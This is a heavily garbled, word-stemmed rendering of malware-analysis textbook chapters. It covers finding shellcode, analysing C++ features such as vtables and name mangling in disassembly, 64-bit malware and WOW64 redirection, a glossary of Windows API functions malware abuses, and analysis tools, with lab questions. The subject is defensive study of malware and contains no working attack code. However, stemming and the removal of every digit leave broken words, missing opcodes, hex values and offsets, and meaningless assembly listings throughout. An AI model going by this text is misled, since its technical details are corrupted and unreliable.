nop sled made long sequenc nop x instruct exploit author creativ order avoid detect popular opcod x xf rang opcod singlebyt instruct increment decrement generalpurpos regist opcod byte rang also consist printabl ascii charact often use nop sled execut decod run must pass filter requir rest shellcodefind shellcod shellcod found varieti sourc includ network traffic web page media file malwar alway possibl creat environ correct version vulner program exploit target malwar analyst must tri reverseengin shellcod use static analysi malici web page typic use javascript profil user system check vulner version browser instal plugin javascript unescap typic use convert encod shellcod text binari packag suitabl execut shellcod often store encod text string includ script trigger exploit encod understood unescap treat text u xxyy encod bigendian unicod charact xx yy hex valu littleendian machin x byte sequenc yy xx result decod exampl consid text string uuuuuaaubbccudde decod follow binari byte sequenc aa cc bb ee dd symbol immedi follow letter u treat singl encod hex byte exampl text string decod binari byte sequenc note singleand doublebyt encod charact use within text string popular techniqu wherev javascript use includ pdf document shellcod use within malici execut usual easi identifi entir program written use shellcod techniqu obfusc shellcod payload store within malwar inject anoth process shellcod payload usual found look typic processinjectionapi call discuss chapter virtualallocex writeprocessmemori createremotethread buffer written process probabl contain shellcod malwar launch remot thread without appli reloc fix up resolv extern depend may conveni malwar writer sinc shellcod bootstrap execut without help origin malwar sometim shellcod store unencod within media file disassembl ida pro load arbitrari binari file includ suspect contain shellcod howev even ida pro load file may analyz shellcod know byte valid code find shellcod usual mean search initi decod like present start shellcod use opcod search list tabl tabl opcod byte search instruct type common opcod call xe uncondit jump xeb xe loop xe xe xe short condit jump x xf attempt disassembl instanc opcod list tabl load file valid code immedi obviou rememb payload like encod decod visibl first none search work may still embed shellcod file format allow encod embed data exampl exploit target cve critic vulner adob reader use malform tiff imag embed within pdf store baseencod string may zlibcompress work particular file format need familiar format kind data contain order search malici contentconclus shellcod author must employ techniqu work around inher limit odd runtim environ shellcod execut includ identifi memori shellcod execut manual resolv shellcod extern depend interact system save space depend usual obfusc use hash valu instead ascii function name also common nearli entir shellcod encod bypass data filter target process techniqu easili frustrat begin analyst materi chapter help recogn common activ instead focu understand main function shellcodelab lab well use weve cover chapter analyz sampl inspir real shellcod debugg easili load run shellcod directli well use util call shellcodelauncherex dynam analyz shellcod binari youll find instruct use util chapter detail analys appendix c lab analyz file labbin use shellcodelauncherex question q shellcod encod q function shellcod manual import q network host shellcod commun q filesystem residu shellcod leav q shellcod lab file labex contain piec shellcod inject anoth process run analyz file question q process inject shellcod q shellcod locat q shellcod encod q function shellcod manual import q network host shellcod commun q shellcod dolab analyz file labpdf get stuck cant find shellcod skip part lab analyz file labscbin use shellcodelauncherex question q exploit use pdf q shellcod encod q function shellcod manual import q filesystem residu shellcod leav q shellcod dochapt c analysi malwar analysi conduct without access sourc code specif sourc languag signific impact assembl exampl c sever featur construct exist c complic analysi result assembl malici program written c creat challeng malwar analyst make harder determin purpos assembl code understand basic c featur appear assembl languag critic analyz malwar written c objectori program unlik c c objectori program languag follow program model use object contain data well function manipul data function objectori program like function c program except associ particular object class object function within c class often call method draw distinct although mani featur objectori program irrelev malwar analysi impact assembl complic analysi note learn c consid read think c bruce eckel avail free download httpwwwmindviewinccom objectorient code arrang userdefin data type call class class like struct except store function inform addit data class like blueprint creat objecton specifi function data layout object memori execut objectori c code use class creat object class object refer instanc class multipl instanc class instanc class data butal object type share function access data call function must refer object type exampl show simpl c program class singl object exampl simpl c class class simpleclass public int x void helloworld printfhello worldn int tmainint argc tchar argv simpleclass myobject myobjecthelloworld exampl class call simpleclass one data element x singl function helloworld creat instanc simpleclass name myobject call helloworld function object public keyword compilerenforc abstract mechan impact assembl code pointer establish data function associ object order access piec data use form objectnamevariablenam function call similarli objectnamefunctionnam exampl exampl want access x variabl would use myobjectx addit access variabl use object name variabl name also access variabl current object use variabl name exampl show exampl exampl c exampl pointer class simpleclass public int x void helloworld x printfx n int tmainint argc tchar argv simpleclass myobject myobjectx myobjecthelloworld simpleclass myotherobject myotherojectx myotherobjecthelloworld helloworld function variabl x access x objectnam x variabl refer address memori access main method use myobjectx within helloworld method variabl access x assum refer object use call function first case myobject depend object use call helloworld function differ memori address store x variabl access exampl function call myotherobjecthelloworld x refer would access differ memori locat call myobjecthelloworld pointer use keep track memori address access access x variabl pointer impli everi variabl access within function doesnt specifi object impli paramet everi object function call within microsoftgener assembl code paramet usual pass ecx regist although sometim esi use instead chapter cover stdcall cdecl fastcal call convent c call convent pointer often call thiscal identifi thiscal convent one easi way identifi objectori code look disassembl assembl exampl gener exampl demonstr usag pointer exampl pointer shown disassembl main function push ebp mov ebp esp sub esp fh mov ebpvar offset mov ebpvarc lea ecx ebpvar call subdf mov ebpvar offset mov ebpvar ah lea ecx ebpvar call subd helloworld function push ebp mov ebp esp sub esp ch push ebx da push esi db push edi dc mov ebpvar ecx df mov eax ebpvar e cmp dword ptr eax ah e jnz short locf e push offset axi x n ed call dsimpprintf main method first alloc space stack begin object store var stack first data valu store object variabl x set offset begin object valu x access label varc ida pro ida pro cant determin whether valu part object label x separ valu pointer object place ecx function call within helloworld function valu ecx retriev use pointer offset code access valu x main function call helloworld second time load differ pointer ecx overload mangl c support code construct known method overload abil multipl function name accept differ paramet function call compil determin version function use base number type paramet use call shown exampl exampl function overload exampl loadfil string filenam loadfil string filenam int option main loadfil cmyfiletxt call first loadfil function loadfil cmyfiletxt genericread call second loadfil see list two loadfil function one take string anoth take string integ loadfil function call within main method compil select function call base number paramet suppli c use techniqu call name mangl support method overload pe file format function label name function paramet specifi compil binari format support overload name file format modifi name inform includ paramet inform exampl function call testfunct part simpleclass class accept two integ paramet mangl name function would testfunctionsimpleclassqaexhhz algorithm mangl name compilerspecif ida pro demangl name compil exampl figur show function testfunct ida pro demangl function show origin name paramet figur ida pro list demangl function name intern function name visibl symbol code analyz malwar usual intern symbol remov howev import export c function mangl name may visibl ida proinherit function overrid inherit objectori program concept parentchild relationship establish class child class inherit function data parent class child class automat function data parent class usual defin addit function data exampl exampl show class call socket exampl inherit exampl class socket public void setdestinationaddr inetaddr addr class udpsocket publicsocket public void senddata char buf inetaddr addr setdestinationaddraddr socket class function set destin address function senddata specif type socket child class call udpsocket send data implement senddata function also call setdestinationaddr function defin socket class exampl senddata function call setdestinationaddr function even though function defin udpsocket class function parent class automat includ child class inherit help programm effici reus code featur requir runtim data structur gener isnt visibl assembl codevirtu vs nonvirtu function virtual function one overridden subclass whose execut determin runtim function defin within parent class function name defin child class child classs function overrid parent function sever popular program model use function order greatli simplifi complex program task illustr use return socket exampl exampl code go senddata network want abl send data via tcp udp one easi way accomplish creat parent class call socket virtual function call senddata two children class call udpsocket tcpsocket overrid senddata function send data appropri protocol code use socket creat object type socket creat whichev socket use instanc time call senddata function senddata function call proper subclass socket whether udpsocket tcpsocket base type socket object origin creat biggest advantag new protocolqdp examplei invent simpli creat new qdpsocket class chang line code object creat call senddata call new qdpsocket version senddata without need chang call individu case nonvirtu function function execut determin compil time object instanc parent class parent classs function call even object runtim belong child class virtual function call object child class child classs version function may call object type instanc parent class tabl show code snippet execut differ function virtual nonvirtualt sourc code exampl virtual function nonvirtu function virtual function class public void foo printfclass class b public public void foo printfclass bn void ga arg argfoo int tmainint argc tchar argv b b gb return class public virtual void foo printfclass class b public public virtual void foo printfclass bn void ga arg argfoo int tmainint argc tchar argv b b gb return code contain two class class class b class b class overrid foo method class code also contain function call foo method outsid either class function declar virtual print class declar virtual print class b code either side ident except virtual keyword case nonvirtu function determin function call made compil time two code sampl exampl code compil object class object could subclass class compil time know object class foo function class call code left print class case virtual function determin function call made runtim class object call runtim class version function call object class b class b function call code right print class bthi function often refer polymorph biggest advantag polymorph allow object perform differ function share common interfac use vtabl c compil add special data structur compil code support virtual function data structur call virtual function tabl vtabl tabl simpli array function pointer class use virtual function vtabl virtual function class entri vtabl tabl show disassembl g function two code snippet tabl left nonvirtu function call foo right virtual call tabl assembl code exampl tabl nonvirtu function call virtual function call push ebp mov ebp esp mov ecx ebparg call sub b pop ebp c retn push ebp mov ebp esp mov eax ebparg mov edx eax mov ecx ebparg b mov eax edx call eax f pop ebp retn sourc code chang small assembl look complet differ function call left look c function seen virtual function call right look differ biggest differ cant see destin call instruct pose big problem analyz disassembl c need track target call instruct argument g function refer use pointer object class subclass class assembl code access pointer begin object code access first byte object figur show virtual function use tabl determin code call first byte object pointer vtabl first byte entri vtabl pointer code first virtual function figur c object virtual function tabl vtabl figur function call find vtabl access see offset call tabl see first vtabl entri access find code call must find vtabl memori go first function list nonvirtu function appear vtabl need target nonvirtu function call fix compil time recogn vtabl order identifi call destin need determin type object locat vtabl spot new oper constructor concept describ next section typic discov address vtabl access nearbi vtabl look like array function pointer exampl exampl show vtabl class three virtual function see vtabl first valu tabl crossrefer element tabl access offset begin tabl access directli item within tabl note exampl line label offf begin vtabl dont confus switch offset tabl cover chapter switch offset tabl would offset locat subroutin label loc instead sub exampl vtabl ida pro f offf dd offset suba f dd offset subc f dd offset sube recogn virtual function crossrefer virtual function directli call part code check crossrefer virtual function see call function exampl figur show crossrefer virtual function crossrefer offset function neither call instruct virtual function almost alway appear way wherea nonvirtu function typic referenc via call instruct figur crossrefer virtual function found vtabl virtual function use inform analyz identifi vtabl instantli know function within tabl belong class function within class somehow relat also use vtabl determin class relationship exist exampl expans exampl includ vtabl two class exampl vtabl two differ class dc offdc dd offset sub e dd offset subc e dd offset sube e dd offset sub ec dd offset unk f offf dd offset suba f dd offset subc f dd offset subenotic function two cross refer function shown figur two crossrefer two vtabl point function suggest inherit relationship rememb child class automat includ function parent class unless overrid exampl sube function parent class also vtabl child class also call child class cant alway differenti child class parent class one vtabl larger subclass exampl vtabl offset f parent class vtabl offset dc child class vtabl larger rememb child class alway function parent class may addit functionscr destroy object two special function c class constructor destructor object creat constructor call object destroy destructor call constructor perform initi need object object creat stack store heap object creat stack need alloc specif memori object object simpli store stack along local variabl destructor object automat call object go scope sometim tend complic disassembl compil may need add except handl code order guarante object destructor call object store stack memori alloc new oper c keyword creat heap space new object call constructor disassembl new oper usual import function spot easili exampl exampl show ida pro disassembl use new oper implement import function sinc new oper regular function unusu function name ida pro identifi function properli new oper label similarli delet oper call heapalloc object freed note object creation delet key element execut flow c program revers engin routin usual provid key insight object layout aid analysi member function exampl new oper disassembl push ebp mov ebp esp sub esp ch mov ebpvar offset offf mov ebpvar offset offdc mov ebpvar offset offf b push call yapaxiz oper newuintin exampl look object store stack offset move locat var vtabl compil show strang behavior put differ offset locat twice row instruct useless second offset overwrit store look offset code would see vtabl two class first offset vtabl parent class second offset vtabl class object createdconclus order analyz malici program written c need understand c featur affect assembl code understand inherit vtabl pointer name mangl wont slow c code youll abl take advantag clue provid addit structur creat c classeslab lab purpos first lab demonstr usag pointer analyz malwar labex question q function x take paramet q url use call urldownloadtofil q program lab purpos second lab demonstr virtual function analyz malwar labex note program danger comput tri upload possibl sensit file machin question q learn interest string program q import tell program q purpos object creat xd virtual function q function could possibl call call edx instruct x q could easili set server malwar expect order fulli analyz malwar without connect internet q purpos program q purpos implement virtual function call program lab third lab longer realist piec malwar lab come configur file name configdat must directori lab order execut properli analyz malwar labex question q learn interest string program q import tell program q xf function call take string config error follow instruct later call cxxthrowexcept function take paramet string function return anyth tell function context use q six entri switch tabl xc q purpos programchapt bit malwar almost current malwar bit written bit architectur order interact bit oss bit oss becom popular bit malwar sever bit architectur introduc first support window itanium design perform comput compat x amd later introduc bit architectur call amd compat x code intel adopt amd call implement emt architectur known x x popular implement bit code window current window version avail bit version support bit bit applic x architectur design upgrad x instruct set drastic differ instruct unchang x x open bit execut ida pro familiar instruct one biggest complic associ bit malwar analysi tool support x assembl exampl write ollydbg support bit applic although windbg ida pro support x assembl requir ida pro advanc version chapter address differ bit bit system provid hint help analyz bit code bit malwar know bit malwar target bit bit machin would anyon bother write bit malwar run bit bit applic system run bit code within bit applic processor run bit code run bit mode run bit code therefor anytim malwar need run insid process space bit process must bither exampl malwar might need compil x architectur kernel code kernel code os within singl memori space kernel code run bit os must bit rootkit often run within kernel rootkit target bit oss must compil bit machin code also antiviru hostbas secur code often contain kernel element malwar design interfer applic must bit least bit compon microsoft made chang bit version window make difficult run malici kernel code detect unauthor modif kernel restrict window abil load driver arent digit sign chang cover detail end chapter plugin inject code must bit order run properli bit process exampl malici internet explor plugin activex control must bit comput run bit version internet explor code inject use techniqu cover chapter also run within anoth process target process bit inject code must also bit shellcod shellcod usual run part exploit within process exploit order exploit vulner bit version internet explor exampl malwar author would need write bit shellcod user run mix bit bit applic malwar writer need write separ version shellcod bit bit victimsdiffer x architectur follow import differ window bit bit architectur address pointer bit generalpurpos registersinclud rax rbx rcx onhav increas size although bit version still access exampl rax regist bit version eax regist generalpurpos regist rdi rsi rbp rsp extend support byte access ad l suffix bit version exampl bp normal access lower bit rbp bpl access lowest bit rbp specialpurpos regist bit renam exampl rip bit instruct pointer twice mani generalpurpos regist new regist label r though r dword bit version regist access rd rd word bit version access w suffix rw rw byte version access l suffix rl rl x also support instruct pointerrel data address import differ x x relat pic shellcod specif x assembl anytim want access data locat offset regist instruct must store entir address call absolut address x assembl access data locat offset current instruct pointer x literatur refer riprel address exampl show simpl c program access memori address exampl simpl c program data access int x void foo int x x assembl code exampl refer global data variabl x order access data instruct encod byte repres data address instruct posit independ alway access address x file load differ locat instruct would need modifi mov instruct access correct address shown exampl exampl x assembl c program exampl mov eax dword youll notic byte address store instruct rememb byte store least signific byte first byte correspond address x recompil x exampl show mov instruct appear exampl exampl x assembl exampl b mov eax dword assembl level doesnt appear chang instruct still mov eax dword address ida pro automat calcul instruct address howev differ opcod level allow code positionindepend x x bit version code instruct byte contain fix address data address data e instruct byte correspond valu xda bit instruct store address data offset current instruct pointer rather absolut address store bit version file load differ locat instruct would still point correct address unlik bit version case file load differ address refer must chang instruct pointerrel address power addit x instruct set significantli decreas number address must reloc dll load instruct pointerrel address also make much easier write shellcod elimin need obtain pointer eip inord access data unfortun addit also make difficult detect shellcod elimin need call pop discuss positionindepend code mani common shellcod techniqu unnecessari irrelev work malwar written run x architectur differ x call convent stack usag call convent use bit window closest bit fastcal call convent discuss chapter first four paramet call pass rcx rdx r r regist addit one store stack note convent hint describ section appli compilergener code run window os processorenforc requir follow convent microsoft guidelin compil specifi certain rule order ensur consist stabil bewar handcod assembl malici code may disregard rule unexpect usual investig code doesnt follow rule case bit code stack space alloc unalloc middl function use push pop instruct howev bit code function alloc space middl function regardless whether theyr push stackmanipul instruct figur compar stack manag bit bit code notic graph bit function stack size grow argument push stack fall stack clean stack space alloc begin function move function call call function stack size grow function return stack size return normal contrast graph bit function show stack grow start function remain level end functionfigur stack size function compil bit bit architectur bit compil sometim gener code doesnt chang stack size middl function bit code never chang stack size middl function although stack restrict enforc processor microsoft bit exceptionhandl model depend order function properli function follow convent may crash caus problem except occur lack push pop instruct middl function make difficult analyst determin mani paramet function easi way tell whether memori address use stack variabl paramet function there also way tell whether regist use paramet exampl ecx load valu immedi function call cant tell regist load paramet reason exampl show exampl disassembl function call compil bit processor exampl call printf compil bit processor c mov eax ebparg c push eax c mov ecx ebpargc c push ecx c mov edx ebparg cb push edx cc mov eax ebparg cf push eax push offset adddd call printf db add esp h bit assembl five push instruct call printf immedi call printf x ad stack clean clearli indic five paramet pass printffunct exampl show disassembl function call compil bit processor exampl call printf compil bit processor c mov ecx rspharg ca mov eax rspharg ce mov rsphvar eax ca mov rd rspharg ca mov rd rspharg cac mov edx rspharg cb lea rcx adddd cb call csprintf bit disassembl number paramet pass printf less evid pattern load instruct rcx rdx r r appear show paramet move regist printf function call mov instruct clear ida pro label move local variabl clear way distinguish move local variabl paramet function call case check format string see mani paramet pass case easi leaf nonleaf function bit stack usag convent break function two categori leaf nonleaf function function call anoth function call nonleaf function function leaf function nonleaf function sometim call frame function requir stack frame nonleaf function requir alloc x byte stack space call function allow function call save regist paramet rcx rdx r r space necessari leaf nonleaf function stack modifi begin end function portion modifi stack frame discuss next prologu epilogu bit code window bit assembl code wellform section begin end function call prologu epilogu provid usefulinform mov instruct begin prologu alway use store paramet pass function compil insert mov instruct anyth els within prologu exampl show exampl prologu small function exampl prologu code small function mov rsparg rdx mov rsparg ecx push rdi aa sub rsp h see function two paramet one bit one bit function alloc x byte stack requir nonleaf function place provid storag paramet function local stack variabl alloc space addit x byte case tell local stack variabl x byte alloc bit except handl unlik except handl bit system structur except handl x use stack bit code fs use pointer current except handler frame store stack function defin except handler result often find instruct modifi fs begin function also find exploit code overwrit except inform stack order get control code execut except structur except handl x use static except inform tabl store pe file store data stack also imag runtimefunctionentri structur pdata section everi function execut store begin end address function well pointer exceptionhandl inform functionwindow bit window bit microsoft develop subsystem call window bit window bit wow order allow bit applic execut properli bit machin subsystem sever featur use malici code wow use bit mode x processor order execut instruct workaround need registri filesystem microsoft dll form core win environ systemroot directori usual windowssystem mani applic access directori search microsoft dll instal dll therefor must separ dll bit process avoid conflict compat reason bit binari store system directori bit applic directori redirect wow directori counterintuit choic bit binari system directori bit binari wow directori analyz bit malwar bit system find write file cwindowssystem need go cwindowswow find file anoth redirect exist bit applic access hkeylocalmachinesoftwar registri key map hkeylocalmachinesoftwarewownod bit applic access softwar registri key redirect bit applic normal unawar run wow mechan allow applic see outsid wow environ first iswowprocess function use bit applic determin run wow process applic access real system directori access cwindowssysn even system redirect wow wowdisablewowfsredirect function disabl filesystem redirect entir given thread registri function regcreatekeyex reg deletekeyex regopenkeyex new flag use specifi applic want access bit bit view registri regardless type applic flag use bit malwar makingchang meant affect bit applicationsbit hint malwar function certain featur bit code provid addit clue malwar function avail bit code featur convent gener appli compilergener code exampl typic easier bit code differenti pointer data valu common size store integ bit although requir still even simpli store index valu iter programm choos bit integ storag tabl show bit bit version function call tabl bit bit function call two paramet bit assembl list bit assembl list f mov eax ebpvar f push eax f mov ecx ebpvar f push ecx fa call sub mov rdx rsphvar mov ecx rsphvar call suba bit assembl shown left two paramet function sub inform type purpos paramet bit bit assembl shown right also see two paramet addit inform first mov instruct move valu rdx tell us bit valueprob pointer second paramet move ecx tell us bit valu ecx bit version rcx regist cant pointer pointer bit still dont know whether paramet integ handl someth els your start understand function littl clue crucial determin function doesconclus analyz bit malwar much differ analyz bit malwar instruct concept similar malwar analyst need understand function call stack usag accomplish order determin mani paramet local variabl function also import understand wow subsystem case need analyz bit execut modifi system directori registri key use os malwar still bit amount bit malwar continu grow use extend even futurelab youll need bit comput bit virtual machin order run malwar lab well advanc version ida pro order analyz malwar lab analyz code labex lab similar lab solut tweak compil bit system question q happen run program without paramet q depend version ida pro main may recogn automat identifi call main function q store stack instruct x x q get program run payload without chang filenam execut q two string compar call strncmp x q function xc take paramet q mani argument pass call createprocess x know lab analyz malwar found labex x x virtual machin malwar similar labex ad x compon question q interest malwar resourc section q malwar compil x xq malwar determin type environ run q malwar differ x environ versu x environ q file malwar drop run x machin would find file file q file malwar drop run x machin would find file file q type process malwar launch run x system q malwar doappendix import window function appendix contain list window function commonli encount malwar analyst along short descript one like use malwar function alreadi document microsoft appendix intend rehash inform microsoft document extrem use describ almost everi function export microsoft dll although lengthi technic use appendix refer perform basic static analysi whether your tri glean inform import tabl look advanc techniqu point right direct youv determin function relev particular piec malwar need analyz function disassembl use microsoft document learn purpos paramet note appendix present select list function exclud function whose purpos clear function name alon readfil deletefil accept use listen incom connect function indic program listen incom connect socket adjusttokenprivileg use enabl disabl specif access privileg malwar perform process inject often call function gain addit permiss attachthreadinput attach input process one thread anoth second thread receiv input event keyboard mous event keylogg spywar use function bindus associ local address socket order listen incom connect bitblt use copi graphic data one devic anoth spywar sometim use function captur screenshot function often ad compil part librari code callnexthookex use within code hook event set setwindowshookex callnexthookex call next hook chain analyz function call callnexthookex determin purpos hook set setwindowshookex certopensystemstor use access certif store local system checkremotedebuggerpres check see specif process includ debug function sometim use part antidebug techniqu cocreateinst creat com object com object provid wide varieti function class identifi clsid tell file contain code implement com object see chapter indepth explan com connect use connect remot socket malwar often use lowlevel function connect commandandcontrol server connectnamedpip use creat server pipe interprocess commun wait client pipe connect backdoor revers shell sometim use connectnamedpip simplifi connect commandandcontrol server controlservic use start stop modifi send signal run servic malwar isus malici servic youll need analyz code implement servic order determin purpos call createfil creat new file open exist file createfilemap creat handl file map load file memori make access via memori address launcher loader injector use function read modifi pe file createmutex creat mutual exclus object use malwar ensur singl instanc malwar run system given time malwar often use fix name mutex good hostbas indic detect addit instal malwar createprocess creat launch new process malwar creat new process need analyz new process well createremotethread use start thread remot process one call process launcher stealth malwar use createremotethread inject code differ process createservic creat servic start boot time malwar use createservic persist stealth load kernel driver createtoolhelpsnapshot use creat snapshot process heap thread modul malwar often use function part code iter process thread cryptacquirecontext often first function use malwar initi use window encrypt mani function associ encrypt ofwhich start crypt deviceiocontrol send control messag user space devic driver deviceiocontrol popular kernel malwar easi flexibl way pass inform user space kernel space dllcanunloadnow export function indic program implement com server dllgetclassobject export function indic program implement com server dllinstal export function indic program implement com server dllregisterserv export function indic program implement com server dllunregisterserv export function indic program implement com server enableexecuteprotectionsupport undocu api function use modifi data execut protect dep set host make suscept attack enumprocess use enumer run process system malwar often enumer process find process inject enumprocessmodul use enumer load modul execut dll given process malwar enumer modul inject findfirstfilefindnextfileus search directori enumer filesystem findresourc use find resourc execut load dll malwar sometim use resourc store string configur inform malici file see function use check rsrc section malwar pe header findwindow search open window desktop sometim function use antidebug techniqu search ollydbg window ftpputfil highlevel function upload file remot ftp server getadaptersinfo use obtain inform network adapt system backdoor sometim call getadaptersinfo part survey gather inform infect machin case use gather mac address check vmware part antivirtu machin techniqu getasynckeyst use determin whether particular key press malwar sometim use function implement keylogg getdc return handl devic context window whole screen spywar take screen captur often use function getforegroundwindow return handl window current foreground desktop keylogg commonli use function determin window user enter keystrok gethostbynam use perform dn lookup particular hostnam prior make ip connect remot host hostnam serv commandandcontrol server often make good networkbas signaturesgethostnam retriev hostnam comput backdoor sometim use gethostnam part survey victim machin getkeyst use keylogg obtain statu particular key keyboard getmodulefilenam return filenam modul load current process malwar use function modifi copi file current run process getmodulehandl use obtain handl alreadi load modul malwar may use getmodulehandl locat modifi code load modul search good locat inject code getprocaddress retriev address function dll load memori use import function dll addit function import pe file header getstartupinfo retriev structur contain detail current process configur run standard handl direct getsystemdefaultlangid return default languag set system use custom display filenam part survey infect victim patriot malwar affect system certain region gettemppath return temporari file path see malwar call function check whether read write file temporari file path getthreadcontext return context structur given thread context thread store thread inform regist valu current state gettickcountretriev number millisecond sinc bootup function sometim use gather time inform antidebug techniqu gettickcount often ad compil includ mani execut simpli see import function provid littl inform getversionex return inform version window current run use part victim survey select differ offset undocu structur chang differ version window getwindowsdirectori return file path window directori usual cwindow malwar sometim use call determin directori instal addit malici program inetaddr convert ip address string like use function connect string specifi sometim use networkbas signatur internetopen initi highlevel internet access function wininet internetopenurl internetreadfil search internetopen good way find start internet access function one paramet internetopen userag sometim make good networkbas signatur internetopenurl open specif url connect use ftp http http url fix often good networkbas signatur internetreadfil read data previous open url internetwritefil write data previous open urlisdebuggerpres check see current process debug often part anti debug techniqu function often ad compil includ mani execut simpli see import function provid littl inform isntadmin check user administr privileg iswowprocess use bit process determin run bit oper system ldrloaddll lowlevel function load dll process like loadlibrari normal program use loadlibrari presenc import may indic program attempt stealthi loadlibrari load dll process may load program start import nearli everi win program loadresourc load resourc pe file memori malwar sometim use resourc store string configur inform malici file lsaenumeratelogonsess enumer logon session current system use part credenti stealer mapviewoffil map file memori make content file access via memori address launcher loader injector use function read modifi pe file use mapviewoffil malwar avoid use writefil modifi content file mapvirtualkey translat virtualkey code charact valu often use bykeylog malwar mmgetsystemroutineaddress similar getprocaddress use kernel code function retriev address function anoth modul get address ntoskrnlex haldll modulefirstmodulenext use enumer modul load process injector use function determin inject code netschedulejobadd submit request program run specifi date time malwar use netschedulejobadd run differ program malwar analyst youll need locat analyz program run futur netshareenum use enumer network share ntquerydirectoryfil return inform file directori rootkit commonli hook function order hide file ntqueryinformationprocess return variou inform specifi process function sometim use antidebug techniqu return inform checkremotedebuggerpres ntsetinformationprocess use chang privileg level program bypass data execut prevent dep oleiniti use initi com librari program use com object must call oleiniti prior call com function openmutex open handl mutual exclus object use malwar toensur singl instanc malwar run system given time malwar often use fix name mutex good hostbas indic openprocess open handl anoth process run system handl use read write process memori inject code process openscmanag open handl servic control manag program instal modifi control servic must call function servic manipul function outputdebugstr output string debugg one attach use anti debug techniqu peeknamedpip use copi data name pipe without remov data pipe function popular revers shell processfirst processnext use begin enumer process previou call createtoolhelpsnapshot malwar often enumer process find process inject queryperformancecount use retriev valu hardwarebas perform counter function sometim use gather time inform part anti debug techniqu often ad compil includ mani execut simpli see import function provid littl inform queueuserapc use execut code differ thread malwar sometim use queueuserapc inject code anoth process readprocessmemoryus read memori remot process recv receiv data remot machin malwar often use function receiv data remot commandandcontrol server registerhotkey use regist handler notifi anytim user enter particular key combin like ctrl alt j regardless window activ user press key combin function sometim use spywar remain hidden user key combin press regopenkey open handl registri key read edit registri key sometim written way softwar achiev persist host registri also contain whole host oper system applic set inform resumethread resum previous suspend thread resumethread use part sever inject techniqu rtlcreateregistrykey use creat registri kernelmod code rtlwriteregistryvalu use write valu registri kernelmod code samiconnect connect secur account manag sam order make futur call access credenti inform hashdump program access sam databas order retriev hash user login password samigetprivatedata queri privat inform specif user secur account manag sam databas hashdump program access sam databas order retriev hash user login passwordssamqueryinformationus queri inform specif user secur account manag sam databas hashdump program access sam databas order retriev hash user login password send send data remot machin malwar often use function send data remot commandandcontrol server setfiletim modifi creation access last modifi time file malwar often use function conceal malici activ setthreadcontext use modifi context given thread inject techniqu use setthreadcontext setwindowshookex set hook function call whenev certain event call commonli use keylogg spywar function also provid easi way load dll gui process system function sometim ad compil sfcterminatewatcherthread use disabl window file protect modifi file otherwis would protect sfcfileexcept also use capac shellexecut use execut anoth program malwar creat new process need analyz new process well startservicectrldispatch use servic connect main thread process servic control manag process run servic must call function within second startup locat function malwar tell function run servic suspendthreadsuspend thread stop run malwar sometim suspend thread order modifi perform code inject system function run anoth program provid c runtim librari window function serv wrapper function createprocess threadfirst threadnext use iter thread process injector use function find appropri thread inject toolhelpreadprocessmemori use read memori remot process urldownloadtofil highlevel call download file web server save disk function popular download implement function download one function call virtualallocex memoryalloc routin alloc memori remot process malwar sometim use virtualallocex part process inject virtualprotectex chang protect region memori malwar may use function chang readonli section memori execut widechartomultibyt use convert unicod string ascii string winexec use execut anoth program malwar creat new process need analyz new process well wlxloggedonsa wlx function function must export dll act authent modul malwar export mani wlx function might perform graphic identif authent gina replac discuss chapter wowdisablewowfsredirect disabl file redirect occur bit file load bit system bit applic write cwindowssystem call function write real cwindowssystem instead redirect cwindowssyswow writeprocessmemori use write data remot process malwar use writeprocessmemori part process inject wsastartup use initi lowlevel network function find call wsastartup often easi way locat start networkrel functionalityappendix b tool malwar analysi appendix list popular malwar analysi tool includ tool discuss book other cover made list somewhat comprehens tri varieti tool figur one best suit need apatedn apatedn tool control dn respons interfac easyto use gui phoni dn server apatedn spoof dn respons user specifi ip address listen udp port local machin apatedn also automat configur local dn server localhost exit apatedn restor origin local dn set use apatedn dynam analysi describ chapter download apatedn free httpwwwmandiantcom autorun autorun util long list autostart locat window persist malwar often instal varieti locat includ registri startup folder autorun search variou possibl locat report gui use autorun dynam analysi see malwar instal download autorun part sysintern suit tool httpwwwsysinternalscom bindiff bindiff power binari comparison plugin ida pro allow quickli compar malwar variant bindiff let pinpoint new function given malwar variant tell function similar miss function similar bindiff indic similar compar two shown figur b figur b bindiff differ comparison show code miss variant function see figur b left side graph miss two box appear right side zoom examin miss instruct bindiff also guess similar overal binari one compar though must gener idb file origin variant malwar work fulli label idb file comparison abl easili recogn actual similar binari bindiff avail purchas httpwwwzynamicscom binnavi binnavi reverseengin environ similar ida pro strength lie graphic approach reverseengin code unlik ida pro binnavi central manag previous analyz databas help track inform team member easili work project share inform find binnavi avail purchas httpwwwzynamicscom boch boch open sourc debugg simul complet x comput boch use want debug short code snippet ida pro ida pro support direct debug mode idb file use boch debug mode input file format isnt importantit dll shellcod dump databas contain x code simpli point code snippet start debug approach often usefulwhen deal encod string configur data download boch free httpbochssourceforgenet tutori instal use boch ida pro found httpwwwhex rayscomproductsidadebuggerbochstutpdf burp suit burp suit typic use test web applic configur allow malwar analyst trap specif server request respons order manipul deliv system burp set maninthemiddl modifi http http request chang header data paramet sent malwar remot server order forc server give addit inform download burp suit httpportswiggernetburp captur bat captur bat dynam analysi tool use monitor malwar run captur bat monitor filesystem registri process activ use exclus list includ mani preset one remov nois order focu malwar analyz captur bat doesnt extens gui like process monitor open sourc modifi download captur bat free httpwwwhoneynetorg cff explor cff explor tool design make pe edit easi tool use edit resourc section ad import scan signatur cff explor support x x system handl net file without net framework instal download cff explor free httpwwwntcorecom deep freez deep freez faron use tool use perform malwar analysi physic hardwar provid vmware snapshot capabl real hardwar run malwar analyz reboot damag done malwar undon system back clean state deep freez avail purchas fromhttpwwwfaronicscom depend walker depend walker static analysi tool use explor dll function import piec malwar work x x binari build hierarch tree diagram dll load memori malwar run discuss depend walker chapter download free httpwwwdependencywalkercom hex editor hex editor allow edit view file contain binari data mani hex editor avail winhex choic book hex workshop editor hexedit hex editor neo fileinsight flexhex choos hex editor look featur like solid gui binari comparison mani datadecod option multibyt xor builtin hash calcul file format pars pattern search mani tool avail purchas come trial version hexray decompil hexray decompil power expens plugin ida pro attempt convert assembl code humanread clike pseudocod text tool instal f cheat button look disassembl ida pro press f plugin open new window c code figur b show pseudocod look like code snippet piec malwar figur b hexray decompil show clike pseudocod gener assemblyin exampl figur b hexray decompil turn assembl instruct eight line c code notic plugin use renam variabl name ida pro exampl easili see paramet pass function nest statement obviou find plugin particularli use tri deciph difficult encod routin case even copi past decompil output use write decod tool hexray decompil best tool market decompil without flaw hexray decompil avail purchas httpwwwhexrayscom ida pro ida pro wide use disassembl malwar analysi discuss ida pro extens throughout 